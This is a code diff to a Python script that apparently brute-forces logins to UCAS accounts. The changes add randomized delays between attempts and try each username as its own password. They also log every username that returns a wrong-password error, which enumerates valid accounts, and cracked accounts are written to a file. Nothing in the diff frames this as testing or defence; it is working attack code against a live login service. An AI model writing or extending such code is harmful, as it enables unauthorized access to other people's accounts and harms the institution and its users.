@@ -24,18 +24,25 @@ class Run(UCAS):
         flogin=LogIn()
     ##########################################################################
         for username in self.userID:
-            time.sleep(0.1)
+            time.sleep(0.1*np.random.rand())
             #       print username
             self.ID_copy.remove(username)
             if username in self.ID.keys():
                 continue
-            log = flogin.run(username=username, pwd=self.pwd)
+#           log = flogin.run(username=username, pwd=self.pwd)
+            log = flogin.run(username=username, pwd=username)
             if log == 'success':
                 f=open('./ucasID.txt','a')
                 f.writelines(username + '\t' + self.pwd + '\n')
                 f.close()
                 logout()
                 print username
+            if log == 'errorPW' and self.WriteValidAccounts:
+                f=open('./Valid_accounts.txt','a')
+                f.writelines(username + '\n')
+                f.close()
+                print username
+
         np.save('./data/ALLid.npy',np.array(self.ID_copy))
 
 if __name__=='__main__':
